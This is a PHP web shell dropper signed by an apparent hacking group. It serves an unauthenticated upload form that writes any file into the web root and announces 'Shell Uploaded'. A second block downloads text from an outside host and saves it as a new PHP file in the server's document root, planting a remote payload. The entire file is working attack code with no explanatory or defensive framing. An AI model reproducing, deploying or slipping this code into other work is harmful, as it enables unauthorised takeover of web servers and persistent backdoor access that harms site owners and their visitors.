<title>Jancox Aploder</title>
<?php
echo '
<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Shell Uploaded ! :)<b><br><br>'; }
else { echo '<b>Not uploaded ! </b><br><br>'; }
}
echo '<i>TrenggalekBlackhat</i>';
?>
<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
function http_get($url){
$im = curl_init($url);
curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($im, CURLOPT_HEADER, 0);
return curl_exec($im);
curl_close($im);
}
$check1 = $_SERVER['DOCUMENT_ROOT'] . "/j3mb0t.php" ;
$text1 = http_get('http://greenlifeoffers.com/cok.txt');
$open1 = fopen($check1, 'w');
fwrite($open1, $text1);
fclose($open1);
if(file_exists($check1)){
}
?>
